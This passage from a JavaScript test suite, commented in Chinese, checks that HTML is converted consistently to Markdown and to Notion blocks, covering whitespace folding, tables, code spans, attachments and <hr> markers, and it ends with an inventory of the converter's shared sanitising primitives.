        expect(texts(blocks)[0]).toContain("前");
    });

    it("浏览器降级副本(object / embed / canvas)不进正文", () => {
        for (const tag of ["object", "embed", "canvas"]) {
            const blocks = run([element(tag, [textNode("fallback-text")])]);
            expect(blocks).toEqual([]);
        }
    });
});

describe("wave27 确认轮: 附件锚分派与跨片段空白折叠", () => {
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };
    const run = (body, mode = "external") => withDom(element("body", body), () => DOMToNotion.cookedToBlocks("<div>x</div>", mode));

    it("a.attachment 经块级分派进入 _cookAttachment(不再退化为普通内联链接)", () => {
        const calls = [];
        const orig = DOMToNotion._cookAttachment;
        DOMToNotion._cookAttachment = (el, blocks, imgMode) => {
            calls.push(el.getAttribute("href"));
            blocks.push({ type: "paragraph", paragraph: { rich_text: [{ type: "text", text: { content: "ATT" } }] } });
        };
        try {
            const anchor = element("a", [textNode("report.pdf")], {
                classList: { contains: (c) => c === "attachment" },
                getAttribute: attrs({ href: "https://cdn.example.com/r.pdf" }),
            });
            const blocks = run([anchor]);
            expect(calls).toEqual(["https://cdn.example.com/r.pdf"]);
            expect(blocks[0].paragraph.rich_text[0].text.content).toBe("ATT");
        } finally {
            DOMToNotion._cookAttachment = orig;
        }
    });

    it("注解切换处的边界空白按 HTML 规则折叠(不再出现双空格)", () => {
        const blocks = run([element("div", [
            textNode("a "),
            element("strong", [textNode("b ")]),
            textNode(" c"),
        ])]);
        const text = blocks[0].paragraph.rich_text.map((r) => r.text.content).join("");
        expect(text).toBe("a b c");
    });

    it("换行边界不被空白折叠吞掉(<br> 产生的空行保留)", () => {
        const blocks = run([element("div", [textNode("a"), element("br"), element("br"), textNode("b")])]);
        const text = blocks[0].paragraph.rich_text.map((r) => r.text.content).join("");
        expect(text).toContain("\n\n");
    });
});

describe("wave28 确认轮: 连字符混合间距分隔线与边界折叠后的空片段", () => {
    it("≥3 个连字符夹杂空白的整行字面量被行首判据转义(thematic break 不再生成)", () => {
        const BS = String.fromCharCode(92);
        for (const src of ["-- --", "-- -", "--  --", "--\t--", "   -- --", "Foo\n-- -"]) {
            const out = Utils.mdLiteral(src);
            expect(out).not.toBe(src);
            expect(out.split(BS).join("")).toBe(src);
            const lastLine = out.split("\n").pop();
            expect(lastLine.trimStart().charAt(0)).toBe(BS);
        }
        expect(Utils.mdLiteral("- -").split(BS).join("")).toBe("- -");
    });

    it("边界折叠把中间片段清空后不再下发空 content(Notion 400)", () => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body: element("body", [element("div", [
                element("b", [textNode("x ")]), textNode(" "), element("i", [textNode("y")]),
            ])]) }) };
        };
        let blocks;
        try { blocks = DOMToNotion.cookedToBlocks("<div>x</div>", "external"); }
        finally { if (orig === undefined) delete globalThis.DOMParser; else globalThis.DOMParser = orig; }
        const rt = blocks[0].paragraph.rich_text;
        expect(rt.every((r) => r.text.content.length > 0)).toBe(true);
        expect(rt.filter((r) => r.annotations && r.annotations.bold).length).toBe(1);
    });
});

// ===== wave29: 三模型九格共识复审确认项的出口面契约 =====
// 每项均先由只读探针(_probe29b.js, 与本体同款 DOM/DOMParser 桩)测出两出口真实输出,
// 再按「同一出口面两出口同口径」写成契约。
describe("wave29 确认轮: 元信息容器 / 表格行序 / 富文本上下文的块级标记", () => {
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };
    const run = (body, mode = "external") => withDom(element("body", body), () => DOMToNotion.cookedToBlocks("<div>x</div>", mode));
    const texts = (blocks) => blocks.map((b) => {
        const holder = b.paragraph || b.quote || b.heading_3 || b.bulleted_list_item;
        return ((holder && holder.rich_text) || []).map((r) => r.text.content).join("");
    });
    const meta = (text) => element("div", [textNode(text)], { classList: { contains: (c) => c === "meta" } });

    it(".meta(图片文件名/尺寸)两出口一致跳过", () => {
        expect(HTMLToMarkdown._convertNode(meta("thumb.png 1024×768"))).toBe("");
        expect(run([meta("thumb.png 1024×768")]).length).toBe(0);
        // 内联路径(未匹配容器内)同口径
        expect(HTMLToMarkdown._convertChildren(element("div", [textNode("前"), meta("m"), textNode("后")])))
            .not.toContain("m");
    });

    it("<a> 回退与附件名不取裸 textContent(script 源码不成可见文本)", () => {
        const script = element("script", [textNode(JS_SOURCE)]);
        const link = element("a", [script], { getAttribute: attrs({ href: "https://h/x" }), querySelector: () => null });
        const rt = DOMToNotion.serializeRichText(element("p", [link])).map((r) => r.text.content).join("");
        expect(rt).not.toContain(JS_SOURCE);
        expect(rt).toBe("https://h/x");
        const blocks = [];
        DOMToNotion._cookAttachment(element("a", [script], {
            getAttribute: attrs({ href: "https://cdn.example.com/a.pdf" }),
            classList: { contains: (c) => c === "attachment" },
        }), blocks, "external");
        expect(blocks[0].file.caption.map((r) => r.text.content).join("")).toBe("attachment");
    });

    it("rich_text 上下文内的 <hr> 保留可见标记(与 Markdown 侧同口径)", () => {
        const quote = element("blockquote", [textNode("a"), element("hr", []), textNode("b")]);
        expect(texts(run([quote])).join("")).toBe("a\n" + DomSpec.HR_TEXT + "\nb");
        expect(HTMLToMarkdown._convertNode(quote)).toContain(DomSpec.HR_TEXT);
    });

    it("表格行采集: 全部 thead 段保留且按浏览器序 thead→tbody→tfoot", () => {
        const th = (t) => element("th", [textNode(t)]);
        const td = (t) => element("td", [textNode(t)]);
        const tr = (cells) => element("tr", cells);
        const cellTexts = (blocks) => blocks[0].table.children.map((row) => row.table_row.cells
            .map((cell) => (cell[0] ? cell[0].text.content : "")).join("|"));
        const twoHead = element("table", [
            element("thead", [tr([th("T1")])]),
            element("tbody", [tr([td("B")])]),
            element("thead", [tr([th("T2")])]),
        ]);
        expect(cellTexts(run([twoHead]))).toEqual(["T1", "T2", "B"]);
        expect(DomSpec.collectTableRows(twoHead).header.length).toBe(2);
        const footFirst = element("table", [
            element("tfoot", [tr([td("合计")])]),
            element("tbody", [tr([td("明细")])]),
        ]);
        expect(cellTexts(run([footFirst]))).toEqual(["明细", "合计"]);
        expect(HTMLToMarkdown._convertTable(footFirst)).toBe("| 明细 |\n| --- |\n| 合计 |");
        // 表头只由首行（thead 行/首行全 <th>）决定 —— 后续行全为 <th> 不升格为列标题
        const lateTh = element("table", [element("tbody", [
            element("tr", [element("td", [textNode("a")])]),
            element("tr", [element("th", [textNode("b")])]),
        ])]);
        const blocks = run([lateTh]);
        expect(blocks[0].table.has_column_header).toBe(false);
    });

    it("嵌套未匹配容器的块级边界(两出口均分段)", () => {
        const inner = element("div", [textNode("b")]);
        const outer = element("div", [textNode("a"), inner, textNode("c")]);
        expect(texts(run([outer]))).toEqual(["a", "b", "c"]);
        expect(HTMLToMarkdown._convertChildren(outer)).toBe("a\n\nb\n\nc");
    });

    it("空块级子节点不吞词边界", () => {
        const div = element("div", [textNode("Hello"), element("div", []), textNode("World")]);
        expect(HTMLToMarkdown._convertChildren(div)).toBe("Hello\n\nWorld");
    });

    it("容器以块级子节点开头时不注入前导空行", () => {
        // 块级子节点前的边界只在**已有内容**时补 —— 否则容器产出的首行会多一个空行
        // (嵌入到引用/列表项上下文时会凭空多出空段落)
        expect(HTMLToMarkdown._convertChildren(element("div", [element("p", [textNode("x")])])))
            .toBe("x\n\n");
        expect(HTMLToMarkdown._convertChildren(element("div", [element("hr", [])]))).toBe("---\n\n");
    });

    it("表格单元格内的 <hr> 两出口一致保留可见标记", () => {
        const table = element("table", [element("tbody", [element("tr", [element("td", [
            textNode("前"), element("hr", []), textNode("后"),
        ])])])]);
        // Markdown 单元格是单行上下文(换行会拆断表格行); Notion rich_text 保留 \n ——
        // 可见文本两出口一致("前"/"---"/"后")
        expect(HTMLToMarkdown._convertTable(table)).toBe("| 前 " + DomSpec.HR_TEXT + " 后 |\n| --- |");
        const cells = run([table])[0].table.children[0].table_row.cells;
        expect(cells.map((cell) => cell.map((r) => r.text.content).join("")).join("")).toBe("前\n" + DomSpec.HR_TEXT + "\n后");
    });

    it("段落首/末片段带注解时仍归一化并去边界空白", () => {
        const blocks = run([element("div", [
            element("b", [textNode(" a ")]), textNode("b c "),
        ])]);
        expect(texts(blocks)[0]).toBe("a b c");
    });

    it("透明下钻不裁掉 code 片段的首尾空白(与 <p> 路径同口径)", () => {
        const code = (t) => element("code", [textNode(t)]);
        const divText = texts(run([element("div", [code("  x  ")])])).join("");
        expect(divText).toBe("  x  ");
        expect(divText).toBe(texts(run([element("p", [code("  x  ")])])).join(""));
    });

    it("空 <code> 不注入字面反引号, 也不把中间内容吞成代码跨度", () => {
        expect(HTMLToMarkdown._convertNode(element("p", [textNode("a"), element("code", []), textNode("b")])))
            .toBe("ab\n\n");
        const md = HTMLToMarkdown._convertNode(element("p", [
            textNode("A"), element("code", []), textNode("B"),
            element("em", [textNode("C")]), textNode("D"), element("code", []), textNode("E"),
        ]));
        expect(md).toContain("*C*");
        expect(md).not.toContain("``");
    });

    it("行内 code 首尾空格补位(CommonMark 不再各剥一个)", () => {
        expect(HTMLToMarkdown._convertNode(element("p", [element("code", [textNode(" a ")])])))
            .toBe("`  a  `\n\n");
        // 只有单侧空格时不补位 —— CommonMark §6.3 仅在**首尾同时**为空格时各剥一个,
        // 此时补位会把可见空白从 " a" 改成 "a"(反而丢内容)
        expect(HTMLToMarkdown._convertNode(element("p", [element("code", [textNode(" a")])])))
            .toBe("` a`\n\n");
        expect(HTMLToMarkdown._convertNode(element("p", [element("code", [textNode("a ")])])))
            .toBe("`a `\n\n");
    });

    it("内联强调跨块级子节点不注入字面定界符", () => {
        const md = HTMLToMarkdown._convertNode(element("blockquote", [
            element("strong", [textNode("a"), element("hr", []), textNode("b")]),
        ]));
        expect(md).toBe("> **a**\n> \n> ---\n> \n> **b**\n\n");
    });

    it("pre 保留内容自身的行首换行, 且 pre 内媒体在 Markdown 侧补发", () => {
        expect(HTMLToMarkdown._convertNode(element("pre", [element("code", [textNode("\ncode")])])))
            .toBe("```\n\ncode\n```\n\n");
        const img = element("img", [], { getAttribute: attrs({ src: "https://cdn.example.com/a.png" }) });
        const md = HTMLToMarkdown._convertNode(element("pre", [element("code", [textNode("x")]), img]));
        expect(md).toContain("```");
        expect(md).toContain("![](https://cdn.example.com/a.png)");
    });

    it("<a> 内媒体: 标签文本只转义一次, 嵌套图片仍为图片", () => {
        const video = () => element("video", [], { getAttribute: attrs({ src: "https://cdn.example.com/v.mp4" }) });
        const a = element("a", [textNode("[x] 2*3*4"), video()], {
            getAttribute: attrs({ href: "https://h/x" }),
            querySelector: (sel) => (sel === "video" ? video() : null),
        });
        const md = HTMLToMarkdown._convertNode(a);
        expect(md).toContain("\\[x\\] 2\\*3\\*4");
        expect(md).not.toContain("\\\\[x");
        expect(md).toContain("\\[视频\\](https://cdn.example.com/v.mp4)");
        const img = () => element("img", [], { getAttribute: attrs({ src: "https://cdn/i.png", alt: "图" }) });
        const a2 = element("a", [img(), video()], {
            getAttribute: attrs({ href: "https://h/x" }),
            querySelector: (sel) => (sel === "video" ? video() : (sel === "img" ? img() : null)),
        });
        expect(HTMLToMarkdown._convertNode(a2)).toContain("![图](https://cdn/i.png)");
    });

    it("表格单元格不注入块级结构符(列表/嵌套表)", () => {
        const cell = (child) => element("table", [element("tbody", [element("tr", [element("td", [child])])])]);
        expect(HTMLToMarkdown._convertTable(cell(element("ul", [element("li", [textNode("a")])]))))
            .toBe("| a |\n| --- |");
        const nested = cell(element("table", [element("tbody", [element("tr", [element("td", [textNode("inner")])])])]));
        const md = HTMLToMarkdown._convertTable(nested);
        expect(md).toBe("| inner |\n| --- |");
        expect(md).not.toContain("--- |  |");
    });

    it("单元格内相邻内联内容不注入空白, 内联格式保留", () => {
        const cell = (children) => element("table", [element("tbody", [element("tr", [element("td", children)])])]);
        // 分隔只在块级子节点处补 —— 相邻内联文本间本无空白, 不得凭空插入(可见内容改变)
        expect(HTMLToMarkdown._convertTable(cell([element("b", [textNode("a")]), textNode("b")])))
            .toBe("| **a**b |\n| --- |");
        expect(HTMLToMarkdown._convertTable(cell([textNode("前"), element("code", [textNode("x")])])))
            .toBe("| 前`x` |\n| --- |");
        // 块级子节点前后仍留分隔(与浏览器上下堆叠的渲染一致)
        expect(HTMLToMarkdown._convertTable(cell([textNode("前"), element("ul", [element("li", [textNode("a")])])])))
            .toBe("| 前 a |\n| --- |");
    });

    it("aside.quote 无内层 blockquote 时保留引用语义", () => {
        const aside = element("aside", [element("p", [textNode("引用文本")])],
            { classList: { contains: (c) => c === "quote" } });
        expect(HTMLToMarkdown._convertNode(aside)).toBe("> 引用文本\n\n");
        const withQuote = element("aside", [element("blockquote", [textNode("引用")])],
            { classList: { contains: (c) => c === "quote" } });
        expect(HTMLToMarkdown._convertNode(withQuote)).toBe("> 引用\n\n");
    });
});

// ===== SURFACE_INVENTORY =====
// 完整清单与可复现计数见 _surface_inventory.md(P0 产出)。新增出口时:
//   1) 在此登记面名 + 该面必须接入的 DomSpec 原语;
//   2) 在对应 describe 中补一组断言(合法原样 / 危险输入 / 空)。
export const SURFACE_INVENTORY = [
    { surface: "非渲染标签(script/style/noscript)", primitive: "DomSpec.SKIP_TAGS / isSkippedNode", hosts: 6, exporters: 2 },
    { surface: "媒体地址回退(src/data-src/data-lazy-src/data-original/srcset/<source>)", primitive: "DomSpec.mediaSrc", hosts: 4, exporters: 2, note: "wave18: 候选统一走「非 http(s) scheme 即占位」判据; 全无候选时返回空(消费侧静默, 不造'已拒'噪声块)" },
    { surface: "地址判据(相对补齐 / scheme 白名单 / 公网校验)", primitive: "DomSpec.safeUrl / mediaUrl", hosts: 5, exporters: 2 },
    { surface: "媒体采集(自身+后代)", primitive: "DomSpec.eachMedia / mediaKind", hosts: 7, exporters: 2 },
    { surface: "单行上下文折叠", primitive: "DomSpec.foldToSingleLine / collapseOneLine", hosts: 11, exporters: 2, note: "记录在案的差异: Markdown 侧折叠 CR/LF, Notion 侧 rich_text 保留 \\n" },
    { surface: "emoji 判据", primitive: "DomSpec.emojiNameOf", hosts: 1, exporters: 1, note: "仅 DOMToNotion 消费(转 emoji 文本); obsidian 侧按普通图片写出 emoji 图链接, 不失信息" },
    { surface: "代码块文本提取(<br> 换行保留)", primitive: "DomSpec.textWithBreaks", hosts: 2, exporters: 2 },
    { surface: "元信息容器(.meta 文件名/尺寸)", primitive: "DomSpec.isMetaNode", hosts: 3, exporters: 2, note: "wave29: 判据原内联在 Notion 出口, Markdown 侧曾把 CSS 隐藏的元信息当正文导出" },
    { surface: "表格行采集(浏览器序 thead→tbody→tfoot)", primitive: "DomSpec.collectTableRows", hosts: 2, exporters: 2, note: "wave29: 原 Notion 侧按源序只取首个 thead(第二个 thead 行静默丢失), Markdown 侧按浏览器序" },
    { surface: "rich_text 上下文的 <hr> 可见标记", primitive: "DomSpec.HR_TEXT", hosts: 2, exporters: 2, note: "wave29: 块级上下文产出原生分隔线, 富文本上下文以可见标记保持两出口一致" },
];
